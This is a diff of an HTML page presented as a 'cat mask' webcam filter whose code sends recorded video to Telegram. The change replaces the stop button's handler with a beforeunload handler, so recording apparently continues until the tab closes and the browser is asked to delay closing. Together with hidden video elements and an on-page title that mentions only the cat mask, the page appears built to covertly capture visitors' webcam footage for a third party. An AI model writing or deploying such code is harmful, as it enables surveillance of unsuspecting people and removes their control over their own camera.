@@ -6,7 +6,7 @@
     <title>Video Recording with Cat Mask to Telegram</title>
     <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
     <style>
-        #video, #canvas, #overlayCanvas {
+        #video, #overlayCanvas {
             display: none;
         }
         #videoDisplay {
@@ -25,7 +25,7 @@
     </style>
 </head>
 <body>
-    <h1>Маска кота</h1>
+    <h1>Маска кота 2.0</h1>
     <div id="videoDisplay">
         <video id="video" width="640" height="480" autoplay></video>
         <canvas id="overlayCanvas" width="640" height="480"></canvas>
@@ -129,10 +129,14 @@
             .catch((error) => console.error('Error sending video to Telegram:', error));
         }
 
-        stopButton.addEventListener('click', () => {
-            if (mediaRecorder) {
+        // Handle browser tab or window close
+        window.addEventListener('beforeunload', (event) => {
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
                 mediaRecorder.stop();
                 console.log('Recording stopped');
+                // Note: The browser may not allow custom messages for the 'beforeunload' event anymore
+                event.preventDefault(); // Required for modern browsers
+                event.returnValue = ''; // For some browsers
             }
         });
     </script>
